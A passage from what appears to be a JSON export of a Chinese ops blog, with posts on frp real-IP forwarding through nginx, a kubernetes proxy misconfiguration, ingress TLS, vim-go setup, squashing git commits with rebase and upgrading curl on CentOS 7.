LogSearch/Analytics：写入即可查询分析，在多个查询条件下1秒可查询10亿级数据，多个聚合条件下1秒可分析1亿级数据。  完整API/SDK  轻松支持自定义管理及二次开发。  四 结论 建议采用现有的阿里云日志服务. 省时且费用比自建低.\n五 参考  阿里云日志架构 阿里云日志成本分析 elk与阿里云日志对比  ","permalink":"https://www.fenghong.tech/blog/ops/log-for-aliyun/","tags":["log"],"title":"阿里云日志方案说明"},{"categories":["ops"],"contents":"[TOC]\n 背景: frp是一款内网穿透神器, 本地的http可以通过frp穿透至外网,详情可以查看官方网站Github. 几经查阅, 对于获取客户端真实ip的配置实在是有点迷茫. 获取不了真实ip, 那么微信回调的接口就会各种报错.\n 官方的解决 获取用户真实 IP HTTP X-Forwarded-For 目前只有 http 类型的代理支持这一功能，可以通过用户请求的 header 中的 X-Forwarded-For 来获取用户真实 IP，默认启用。\nProxy Protocol frp 支持通过 Proxy Protocol 协议来传递经过 frp 代理的请求的真实 IP，此功能支持所有以 TCP 为底层协议的类型，不支持 UDP。\nProxy Protocol 功能启用后，frpc 在和本地服务建立连接后，会先发送一段 Proxy Protocol 的协议内容给本地服务，本地服务通过解析这一内容可以获得访问用户的真实 IP。所以不仅仅是 HTTP 服务，任何的 TCP 服务，只要支持这一协议，都可以获得用户的真实 IP 地址。\n需要注意的是，在代理配置中如果要启用此功能，需要本地的服务能够支持 Proxy Protocol 这一协议，目前 nginx 和 haproxy 都能够很好的支持。\n这里以 https 类型为例:\n# frpc.ini [web] type = https local_port = 443 custom_domains = test.yourdomain.com # 目前支持 v1 和 v2 两个版本的 proxy protocol 协议。 proxy_protocol_version = v2 只需要在代理配置中增加一行 proxy_protocol_version = v2 即可开启此功能。\n 本地的 https 服务可以通过在 nginx 的配置中启用 Proxy Protocol 的解析并将结果设置在 X-Real-IP 这个 Header 中就可以在自己的 Web 服务中通过 X-Real-IP 获取到用户的真实 IP。\n 我这边配置了Proxy Protocol, 直接报错,使用不了, 报的是网络错误, 如果有高手, 可以告诉我这怎么玩.\n我的解决思路 架构图 客户端通过阿里云的负载均衡(SLB)访问Nginx服务器, Nginx反向代理至frp server, frp_server与frp_client通过frp协议实现内网穿透. frp_client配置本地的nginx负载层, nginx负载层流量汇入kubenetes集群. 为用户提供服务.\n   主机 ip 备注     阿里云SLB 😄    Nginx-web 172.16.111.137 😄   frp_server 172.16.111.129 😄   frp_client 192.168.0.23 😄   Nginx_LB 192.168.0.21 😄   kubernetes-node 192.168.0.30,192.168.0.65,192.168.0.88 😄    SLB后的nginx-web配置 配置入口的nginx的时候, 做ssl 会话卸载. 这样从frp_server到kubenetes集群都可以直接使用http协议. 这层的nginx非常重要, 如果没有, 那么获取的remote_ip 永远都是127.0.0.1或者是内网ip.\nupstream frp { server 172.16.111.129:80; # 这个是frp_server的内网ip和http监听端口 } server { listen 80 ; server_name frp.fenghong.tech; charset utf-8; add_header Content-Security-Policy upgrade-insecure-requests; location / { proxy_pass http://frp; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } access_log /var/log/nginx/frp.fenghong.tech.access.log main; error_log /var/log/nginx/frp.fenghong.tech.error.log info; } server { listen 443 ssl ; server_name frp.fenghong.tech; charset utf-8; ssl_certificate ssl/frp.fenghong.tech; ssl_certificate_key ssl/frp.fenghong.tech; ssl_session_timeout 5m; add_header Content-Security-Policy upgrade-insecure-requests; location / { proxy_set_header Host $host; proxy_pass http://frp; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } access_log /var/log/nginx/frp.fenghong.tech.access.log main; error_log /var/log/nginx/frp.fenghong.tech.error.log info; } frp_server配置 这个参考官网,也没有什么好说的, 这里是我配置. 仅供参考. 我这边admin端口都开了防火墙的, 只允许内网访问. 可以酌情配置.\n[common] bind_addr = 0.0.0.0 bind_port = 7200 bind_udp_port = 7201 kcp_bind_port = 7200 vhost_http_port = 80 ## 如果前端nginx已经做了ssl会话卸载.那么这个https_port可以省略了. vhost_https_port = 443 dashboard_addr = 0.0.0.0 dashboard_port = 7500 dashboard_user = admin dashboard_pwd = weakpasswod log_file = ./frps.log log_level = debug log_max_days = 3 token = weakpasswod max_pool_count = 5 max_ports_per_client = 0 authentication_timeout = 0 tcp_mux = true frp_client配置 这里贴一下我的配置.\n[common] server_addr = `frp_server的外网ip` # 自行更改 server_port = 7200 token = weakpassword [frp.fenghong.tech] type = http local_ip = 192.168.0.21 local_port = 80 remote_port = 80 use_encryption = false use_compression = true custom_domains = frp.fenghong.tech 本地nginx-LB负载均衡服务配置. 因为我后端是kubernetes集群, 而且service又没有SLB类型的, 采用的clusterip +nginx-ingress暴露本地的服务.这里的nginx相当于负载均衡作用.\nupstream k8s-fenghong { ip_hash; server 192.168.0.30:80; server 192.168.0.65:80; server 192.168.0.88:80; } server { listen 80 ; server_name frp.fenghong.tech; charset utf-8; add_header Content-Security-Policy upgrade-insecure-requests; location / { proxy_pass http://k8s-fenghong ; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } access_log /var/log/nginx/frp.fenghong.tech.access.log main; error_log /var/log/nginx/frp.fenghong.tech.error.log info; } 后面就是kubernetes集群相关了, 这边就到此为止吧.\n查看日志进行验证 nginx日志格式, 可以看到$http_x_forwarded_for已经获取到了我们的客户端的RealIP\n$ cat nginx.conf | grep -C log_format log_format main '$remote_addr - $remote_user [$time_local] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot; \u0026quot;$proxy_add_x_forwarded_for\u0026quot;'; $ tail -f /var/log/nginx/frp.fenghong.tech.access.log 192.168.0.23 - - [14/Jul/2020:19:00:48 +0800] \u0026quot;POST /api/company/isExists/mobile HTTP/1.1\u0026quot; 200 79 \u0026quot;https://frp.fenghong.tech.access/api/swagger-ui.html\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36\u0026quot; \u0026quot;124.78.19.227, 172.16.111.137\u0026quot; \u0026quot;124.78.19.227, 172.16.111.137, 192.168.0.23\u0026quot; 感谢frp作者的努力.\n参考  github#270  ","permalink":"https://www.fenghong.tech/blog/ops/frp-get-realip/","tags":["frp"],"title":"frp内网穿透http获取客户端真实ip"},{"categories":["kubernetes"],"contents":"[TOC]\n 在创建好kubernetes集群后， 内网访问便是稀松平常的事情。 由于使用了http_proxy代理，但是未设置no_proxy导致各种错误。为什么设置代理，因为 github头像老是不显示。\n 排查思路 内网的另外一台主机(这台主机用的是provixy代理)使用curl命令进行排查，查看集群version信息，没有任何异常返回200。\n$ curl -ik https://apiserver.cluster.local:6443/version HTTP/2 200 content-type: application/json content-length: 263 date: Wed, 08 Jul 2020 10:00:59 GMT { \u0026quot;major\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;minor\u0026quot;: \u0026quot;18\u0026quot;, \u0026quot;gitVersion\u0026quot;: \u0026quot;v1.18.0\u0026quot;, \u0026quot;gitCommit\u0026quot;: \u0026quot;9e991415386e4cf155a24b1da15becaa390438d8\u0026quot;, \u0026quot;gitTreeState\u0026quot;: \u0026quot;clean\u0026quot;, \u0026quot;buildDate\u0026quot;: \u0026quot;2020-03-25T14:50:46Z\u0026quot;, \u0026quot;goVersion\u0026quot;: \u0026quot;go1.13.8\u0026quot;, \u0026quot;compiler\u0026quot;: \u0026quot;gc\u0026quot;, \u0026quot;platform\u0026quot;: \u0026quot;linux/amd64\u0026quot; }% 使用curl命令进行资源查看, 此时已经出现了401错误。Unauthorized， 其实这里我很懵逼的， 想了想怎么会出现这个问题， 在kubernetes集群内部访问是没有问题的。\n$ curl -H 'Authorization: Bearer ***' https://apiserver.cluster.local:6443/api --insecure { \u0026quot;kind\u0026quot;: \u0026quot;Status\u0026quot;, \u0026quot;apiVersion\u0026quot;: \u0026quot;v1\u0026quot;, \u0026quot;metadata\u0026quot;: { }, \u0026quot;status\u0026quot;: \u0026quot;Failure\u0026quot;, \u0026quot;message\u0026quot;: \u0026quot;Unauthorized\u0026quot;, \u0026quot;reason\u0026quot;: \u0026quot;Unauthorized\u0026quot;, \u0026quot;code\u0026quot;: 401 } 继续使用curl命令访问kuboard的api接口, 这个在集群内访问和内网的主机访问都没有问题。\n$ curl 'http://192.168.0.179:6443/api/apps/v1/namespaces/kube-system/deployments' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \\ -H 'Accept: application/json, text/plain, */*' \\ -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' \\ --compressed \\ -H 'Authorization: Bearer ×××' \\ -H 'Connection: keep-alive' \\ -H 'Referer: http://192.168.0.179:32567/namespace/kube-system' \\ -H 'Cookie: _ga=GA1.1.240841703.1594199764; _gid=GA1.1.812371467.1594199764; _gat=1' { ... //数据了太多。没有复制了 } 使用kubectl 命令行访问kubernetes集群\n使用自己创建的ServiceAccount，获取资源信息\n$ kubectl --kubeconfig=./kubectl-config.yaml get pods error: You must be logged in to the server (Unauthorized) 使用admin.conf配置文件，获取资源信息\n$ kubectl get pods Unable to connect to the server: x509: certificate signed by unknown authority (possibly because of \u0026quot;crypto/rsa: verification error\u0026quot; while trying to verify candidate authority certificate \u0026quot;kubernetes\u0026quot;) 越访问，心越凉。 咋内网的就各种问题。 出现的还不一样， google后基本是admin.conf配置文件忘记复制了。 但是我这边是集群内部是可以访问的， 在master节点执行是全ok的。\n另外。 使用的cow代理的一台内网主机曾经也发生过问题。 但是被我忽略了， 大概的错误是\n$ kubectl get pods Unable to connect to the server: Forbidden 然后curl命令返回的是403.\n$ curl -ik https://apiserver.cluster.local:6443/version HTTP/1.1 403 Forbidden Connection: keep-alive Cache-Control: no-cache Pragma: no-cache Content-Type: text/html Content-Length: 346 curl: (56) Received HTTP code 403 from proxy after CONNECT 这里灵机一闪， proxy问题。 因为我开发的主机设置, 没有设置no_proxy,全部走的cow这个自动分发流量的代理上。\n$ cat ~/.zshrc export http_proxy=\u0026quot;http://127.0.0.1:7777\u0026quot; export https_proxy=\u0026quot;http://127.0.0.1:7777\u0026quot; 解决方法.\n$ export no_proxy=\u0026quot;apiserver.cluster.local,192.168.0.179,127.0.0.1\u0026quot; $ kubectl get pods NAME READY STATUS RESTARTS AGE web-hello-world-6c7f79b76d-5mzjp 1/1 Running 0 10d web-hello-world-6c7f79b76d-8psvs 1/1 Running 0 173m web-hello-world-6c7f79b76d-mqp9j 1/1 Running 0 173m 而内网服务器的代理设置是provixy， 出现的问题是不一样的。\n$ cat ~/.zshrc export http_proxy=http://192.168.0.23:8118 export https_proxy=http://192.168.0.23:8118 同理， 设置no_proxy即可, no_proxy暂时不支持通配符 比如192.168.0.×\n$ printf -v no_proxy '%s,' 192.168.0.{1..255},; $ export no_proxy=\u0026quot;${no_proxy%,},apiserver.cluster.local,127.0.0.1\u0026quot; $ kubectl get pods NAME READY STATUS RESTARTS AGE web-hello-world-6c7f79b76d-5mzjp 1/1 Running 0 10d web-hello-world-6c7f79b76d-8psvs 1/1 Running 0 174m web-hello-world-6c7f79b76d-mqp9j 1/1 Running 0 174m 记录一下。 一次http_proxy引起的问题。\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-error-proxy/","tags":["kubernetes，ssl","Unauthorized"],"title":"httpProxy代理导致kubernetes出现的异常错误"},{"categories":["kubernetes"],"contents":"[TOC]\n 可以直接在 Ingress 中配置 HTTPS 证书，使得你的网站支持 HTTPS 协议。\n使用openssl创建自用证书或使用acme创建免费的证书.\n 创建secret 默认已经已经有了ssl证书，证书为youpenglai.crt，秘钥youpenglai.key\n$ kubectl create secret tls youpenglai-tls --cert=youpenglai.crt --key=youpenglai.key secret/youpenglai-tls created $ kubectl describe secrets youpenglai-tls Name: youpenglai-tls Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: \u0026lt;none\u0026gt; Type: kubernetes.io/tls Data ==== tls.key: 1679 bytes tls.crt: 3559 bytes ingress配置 $ cat ingress-hello-world.yaml --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: annotations: k8s.kuboard.cn/displayName: hello-world k8s.kuboard.cn/workload: web-hello-world creationTimestamp: '2020-06-24T08:17:14Z' generation: 2 labels: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world name: web-hello-world namespace: default spec: rules: - host: helloworld-k8s.youpenglai.com http: paths: - backend: serviceName: web-hello-world servicePort: helloworld path: / tls: - hosts: - helloworld-k8s.youpenglai.com secretName: youpenglai-tls 重新apply一下即可更新.\n$ kubectl apply -f ingress-hello-world.yaml 再次访问 https://helloworld-k8s.youpenglai.com\nhello-world镜像 goang源码如下\n$ cat hello-world.go package main import ( \u0026quot;fmt\u0026quot; \u0026quot;log\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;os\u0026quot; ) func main() { http.HandleFunc(\u0026quot;/\u0026quot;, func(w http.ResponseWriter, r *http.Request) { log.Printf(\u0026quot;%s %s %s %s\u0026quot;, r.Method, r.URL, r.Host, r.RemoteAddr) version := os.Getenv(\u0026quot;VERSION\u0026quot;) if version == \u0026quot;\u0026quot; { version = \u0026quot;v1.0.1\u0026quot; // version = \u0026quot;v2\u0026quot; 模拟发布. v3 v4 v5 v6 } fmt.Fprintf(w, \u0026quot;Hello Kubernetes ! Hello World version: %s\\n\u0026quot;, version) }) log.Fatal(http.ListenAndServe(\u0026quot;:8000\u0026quot;, nil)) } 构建dockerfile\n$ cat Dockerfile FROM golang:1.14.3 AS builder ENV GO111MODULE=on ENV GOPROXY=https://goproxy.io WORKDIR /root COPY hello-world.go . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o /deploy hello-world.go FROM alpine:3.7 RUN apk add tzdata ca-certificates \u0026amp;\u0026amp; cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime \\ \u0026amp;\u0026amp; echo \u0026quot;Asia/Shanghai\u0026quot; \u0026gt; /etc/timezone \\ \u0026amp;\u0026amp; apk del tzdata \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY --from=builder /deploy /bin/deploy ENTRYPOINT [\u0026quot;/bin/deploy\u0026quot;] deployment及service的yaml配置\n--- apiVersion: apps/v1 kind: Deployment metadata: namespace: default name: web-hello-world annotations: k8s.kuboard.cn/workload: web-hello-world k8s.kuboard.cn/displayName: hello-world deployment.kubernetes.io/revision: '3' k8s.kuboard.cn/ingress: 'true' k8s.kuboard.cn/service: ClusterIP labels: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world spec: selector: matchLabels: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world revisionHistoryLimit: 10 template: metadata: labels: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world spec: securityContext: seLinuxOptions: {} imagePullSecrets: [] restartPolicy: Always initContainers: [] containers: - image: louisehong/hello-world imagePullPolicy: Always name: hello-world volumeMounts: [] resources: limits: requests: env: [] lifecycle: {} ports: - name: tcp containerPort: 8000 protocol: TCP volumes: [] dnsPolicy: ClusterFirst dnsConfig: {} terminationGracePeriodSeconds: 30 progressDeadlineSeconds: 600 strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 25% maxSurge: 25% replicas: 1 --- apiVersion: v1 kind: Service metadata: namespace: default name: web-hello-world annotations: k8s.kuboard.cn/workload: web-hello-world k8s.kuboard.cn/displayName: hello-world labels: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world spec: selector: k8s.kuboard.cn/layer: web k8s.kuboard.cn/name: web-hello-world type: ClusterIP ports: - port: 8000 targetPort: 8000 protocol: TCP name: helloworld nodePort: 0 如果使用kuboard进行在Ingress中部署https证书。 建议参考这篇文章kuborad官网\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-ingress-ssl/","tags":["kubernetes，ssl","ingress"],"title":"kuberbetes ingress ssl证书配置"},{"categories":["golang"],"contents":"[TOC]\n前言  vim是linux系统下常用的代码编辑器，默认情况下不支持go的代码高亮和语法检查，不过可以通过安装vim插件来支持go的开发 Vim-go是当前使用最为广泛的用于搭建Golang开发环境的vim插件，这里我同样使用vim-go作为核心和基础进行环境搭建的。vim-go利 用开源Vim插件管理器安装，gmarik/Vundle.vim是目前被推荐次数更多的Vim插件管理器.\n 安装后是这样的\n安装 基于vundle安装.\n$ git clone https://github.com/fatih/vim-go.git ~/.vim/bundle/vim-go $ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim 配置vim如下,:wq保存后, 再次进入vim执行PluginInstall命令. 这里我顺便安装了YouCompleteMe插件, 实现了实时补全.\n$ vim ~/.vimrc set nocompatible \u0026quot; be iMproved, required filetype off \u0026quot; required \u0026quot; set the runtime path to include Vundle and initialize set rtp+=~/.vim/bundle/Vundle.vim call vundle#begin() \u0026quot; \u0026quot; \u0026quot; let Vundle manage Vundle, required Plugin 'gmarik/Vundle.vim' Plugin 'fatih/vim-go' \u0026quot;https://github.com/fatih/vim-go Plugin 'https://github.com/Valloric/YouCompleteMe' \u0026quot; \u0026quot; All of your Plugins must be added before the following line call vundle#end() \u0026quot; required filetype plugin indent on \u0026quot; required \u0026quot;options set number set autoindent set shiftwidth=4 set ts=4 set expandtab set softtabstop=4 set paste set fileencodings=utf-8,gb2312,gb18030,gbk,ucs-bom,cp936,latin1 set termencoding=utf-8 set fileformats=unix set encoding=utf-8 YouCompleteMe安装 基于python3 编译安装, 需要用到的依赖build-essential cmake vim python3-dev python3-pip\n$ sudo apt install build-essential cmake vim python3-dev python3-pip $ cd .vim/bundle/YouCompleteMe $ python3 install.py --go-completer  The ycmd server SHUT DOWN (restart with \u0026hellip;low the instructions in the documentation.\n 打开vi, 这个会有一个提示, 一般是查看具体的文件日志/tmp/ycmd_45801_stderr__5ne0_yu.log, 我的是在这个文件里面. 报的是pathtools not installed, 这里安装一下即可. 具体错误可以具体分析.\n$ tail -f /tmp/ycmd_34409_stderr_4efg2b09.log from ycmd import extra_conf_store, hmac_plugin, server_state, user_options_store File \u0026quot;/home/louis/.vim/bundle/YouCompleteMe/third_party/ycmd/ycmd/server_state.py\u0026quot;, line 22, in \u0026lt;module\u0026gt; from ycmd.completers.language_server import generic_lsp_completer File \u0026quot;/home/louis/.vim/bundle/YouCompleteMe/third_party/ycmd/ycmd/completers/language_server/generic_lsp_completer.py\u0026quot;, line 19, in \u0026lt;module\u0026gt; from ycmd.completers.language_server import language_server_completer File \u0026quot;/home/louis/.vim/bundle/YouCompleteMe/third_party/ycmd/ycmd/completers/language_server/language_server_completer.py\u0026quot;, line 28, in \u0026lt;module\u0026gt; from watchdog.events import PatternMatchingEventHandler File \u0026quot;/home/louis/.vim/bundle/YouCompleteMe/third_party/ycmd/third_party/watchdog_deps/watchdog/build/lib3/watchdog/events.py\u0026quot;, line 91, in \u0026lt;module\u0026gt; from pathtools.patterns import match_any_paths ModuleNotFoundError: No module named 'pathtools' 这里我们安装pathtools即可\n$ sudo pip3 install pathtools ","permalink":"https://www.fenghong.tech/blog/go/go-vim/","tags":["go-vim"],"title":"vim-go插件安装"},{"categories":["ops"],"contents":"[toc]\n新建测试仓库 为了不破坏现有的仓库，我们首先创建一个新建一个实验repo，所有操作都在该仓库下操作。创建命令如下：\n$ mkdir rebase-repo $ cd rebase-repo $ git init rebase-repo $ git commit --allow-empty -m \u0026quot;init\u0026quot; $ git remote add origin git@code.aliyun.com:louisehong/rebase-repo.git 模拟开发分支的多次提交 新建一个squash分支, 即日常自己的开发分支, 模拟多次提交, 查看提交的日志\n$ git checkout -b squash $ for i in H e l l o , ' ' C h o n g c h o n g; do echo \u0026quot;$i\u0026quot; \u0026gt;\u0026gt;hello.txt git add hello.txt git commit -m \u0026quot;增加Hello，$i\u0026quot; done $ git log commit e782719bcaa05a177ddd0566e31f808d032602da (HEAD -\u0026gt; squash) Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:06 2020 +0800 增加Hello，g commit ffa3f28eb1a771d81167c1bfbfe52b2cc54564e0 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:06 2020 +0800 增加Hello，n commit 7fc2daf990c837c33506ab56b251c01156d8aa2c Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:06 2020 +0800 增加Hello，o commit d862c714350af92548417bceeda0c7c7c9857162 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，h commit c68317bdb7a734e4cb3dbdb73a83c05099ba5cfe Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，c commit e240ef875d7a89f0043e0cf349953b589940fdd5 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，g commit 2e50a7d72f409672af874b82c5f4b00e1b9f56b4 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，n commit 8a4a3b86f01619d6b68cae1cb8abae5a14a58515 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，o commit 0e3f4c8407581027265286769b57edfbbb9e5ee4 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，h commit 3ca487fdc148c4b40163e00de1880548cffeb709 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:05 2020 +0800 增加Hello，C commit 912bd67bee15d5608958f4ccd19b76c1afffc210 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello， commit 5e8415bab1156ebdc82172aee6863c1b50fa4ed9 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，, commit 4f60c257112de5509270ccc3116cb7a91602e987 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，o commit 66a94f9130b186b65ac70ecc4ede93bc8aac1445 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，l commit bf632988e5581742d53f81007891f9c793778920 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，l commit 38b3aa83624df2f073b7489dcefda022fc324eec Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，e commit cb7b1f8ec5da79a106fb1efd2d98b539c6d716f4 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，H commit ddfd3c128a7fcbc59b6f9f7075b8d19d25273a45 (origin/master, master) Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:43:13 2020 +0800 init 可以看到很多的提交日志. 合并多个提交, 使用rebase功能. 这里会进入vim模式. 将前面的提交都显示出来, 使用替换命令2,$s/pick/squash,然后:wq保存,合并多个提交.\n $ git rebase -i master pick 424c375 增加Hello，H pick f1416a9 增加Hello，e pick 4c37233 增加Hello，l pick 7446b97 增加Hello，l pick fb53788 增加Hello，o pick e87bbee 增加Hello，, pick d085a0e 增加Hello， pick 830fdfc 增加Hello，C pick 34e9c95 增加Hello，h pick e654386 增加Hello，o pick a17be3c 增加Hello，n pick c932c0d 增加Hello，g pick e1d4d22 增加Hello，c pick 34d2fe8 增加Hello，h pick 9ee2e6c 增加Hello，o pick 327c529 增加Hello，n pick 6a6f4c0 增加Hello，g # Rebase 252ce30..6a6f4c0 onto 327c529 (17 commands) # # Commands: # p, pick \u0026lt;commit\u0026gt; = use commit # r, reword \u0026lt;commit\u0026gt; = use commit, but edit the commit message # e, edit \u0026lt;commit\u0026gt; = use commit, but stop for amending # s, squash \u0026lt;commit\u0026gt; = use commit, but meld into previous commit # f, fixup \u0026lt;commit\u0026gt; = like \u0026quot;squash\u0026quot;, but discard this commit's log message # x, exec \u0026lt;command\u0026gt; = run command (the rest of the line) using shell # b, break = stop here (continue rebase later with 'git rebase --continue') # d, drop \u0026lt;commit\u0026gt; = remove commit # l, label \u0026lt;label\u0026gt; = label current HEAD with a name # t, reset \u0026lt;label\u0026gt; = reset HEAD to a label # m, merge [-C \u0026lt;commit\u0026gt; | -c \u0026lt;commit\u0026gt;] \u0026lt;label\u0026gt; [# \u0026lt;oneline\u0026gt;] # . create a merge commit using the original merge commit's # . message (or the oneline, if no original merge commit was # . specified). Use -c \u0026lt;commit\u0026gt; to reword the commit message. 保存后, 会有一个提交信息的整合, 然后也会进入vim模式,这里 编辑你想要的commit信息即可, 然后:wq保存.\n# This is a combination of 17 commits. # This is the 1st commit message: 增加Hello，World , Test Rebase [detached HEAD 5810da3] 增加Hello，World , Test Rebase Date: Tue Jun 30 10:07:04 2020 +0800 1 file changed, 17 insertions(+) Successfully rebased and updated refs/heads/squash. rebase至master分支 到了这一步, 基本的rebase合并已经做完. 将自己的squash分支rebase到master分支即可, git log果然没有多次提交记录了.\n$ git checkout master $ git rebase squash $ git branch -D squash $ git log commit 5810da36cce6d0558c11daa80f9f7f5c220c6d70 (HEAD -\u0026gt; master) Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 10:07:04 2020 +0800 增加Hello，World , Test Rebase commit 252ce30404ba0ff2a071fa7cd27d0781365eafae (origin/master) Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:47:04 2020 +0800 增加Hello，Hello,World commit ddfd3c128a7fcbc59b6f9f7075b8d19d25273a45 Author: louisehong \u0026lt;louisehong4168@gmail.com\u0026gt; Date: Tue Jun 30 09:43:13 2020 +0800 init $ git push origin master ","permalink":"https://www.fenghong.tech/blog/ops/git-rebase/","tags":["git","rebase"],"title":"git-rebase合并多commit记录"},{"categories":["ops","jenkins"],"contents":"[TOC]\n背景  偶然有一次机会使用到了curl 命令行中 --data-raw 选项， 但是提示是curl: option --data-raw: is unknown, 网上查询了蛮多， 也没有写什么解决方案，估摸着是版本太低的缘故。\n 目前的centos 7 的yum仓库版本, 最新版应该到了 7.71.0 了 ,Release-Date: 2020-06-24\n$ curl -V curl 7.29.0 (x86_64-redhat-linux-gnu) libcurl/7.29.0 NSS/3.44 zlib/1.2.7 libidn/1.28 libssh2/1.8.0 Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp scp sftp smtp smtps telnet tftp Features: AsynchDNS GSS-Negotiate IDN IPv6 Largefile NTLM NTLM_WB SSL libz unix-sockets 在 RedHat/CentOS 系统中，curl 默认使用的密码学库是 NSS，升级 curl 有两种方法，分别是编译安装和包安装。选择yum升级方便，编译升级太耗时。\n查看 curl 官方页面 http://curl.haxx.se/download.html#LinuxRedhat，找到对应页面 https://mirror.city-fan.org/ftp/contrib/sysutils/Mirroring，这个页面的介绍非常详细。\n升级 一开始没考虑依赖libcurl和libssh2问题。 直接安装curl, 直接报错~\nlibcurl(x86-64) \u0026gt;= 7.71.0-1.0.cf.rhel7\nlibssh2(x86-64) \u0026gt;= 1.9.0\n$ yum install http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/curl-7.71.0-1.0.cf.rhel7.x86_64.rpm ... Error: Package: curl-7.71.0-1.0.cf.rhel7.x86_64 (/curl-7.71.0-1.0.cf.rhel7.x86_64) Requires: libcurl(x86-64) \u0026gt;= 7.71.0-1.0.cf.rhel7 Installed: libcurl-7.29.0-57.el7.x86_64 (@base) libcurl(x86-64) = 7.29.0-57.el7 $ yum install http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/curl-7.71.0-1.0.cf.rhel7.x86_64.rpm \\ http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/libcurl-7.71.0-1.0.cf.rhel7.x86_64.rpm ... Error: Package: libcurl-7.71.0-1.0.cf.rhel7.x86_64 (/libcurl-7.71.0-1.0.cf.rhel7.x86_64) Requires: libssh2(x86-64) \u0026gt;= 1.9.0 Installed: libssh2-1.8.0-3.el7.x86_64 (@anaconda) libssh2(x86-64) = 1.8.0-3.el7 安装依赖libcurl和libssh2即可解决\n$ yum install http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/curl-7.71.0-1.0.cf.rhel7.x86_64.rpm \\ http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/libcurl-7.71.0-1.0.cf.rhel7.x86_64.rpm \\ http://www.city-fan.org/ftp/contrib/yum-repo/rhel7/x86_64/libssh2-1.9.0-5.0.cf.rhel7.x86_64.rpm -y 安装完成后, 查看安装的版本号, centos 6安装应该大同小异, 这边就不赘述了.\n$ curl -V curl 7.71.0 (x86_64-redhat-linux-gnu) libcurl/7.71.0 NSS/3.44 zlib/1.2.7 libpsl/0.7.0 (+libicu/50.1.2) libssh2/1.9.0 nghttp2/1.33.0 Release-Date: 2020-06-24 Protocols: dict file ftp ftps gopher http https imap imaps ldap 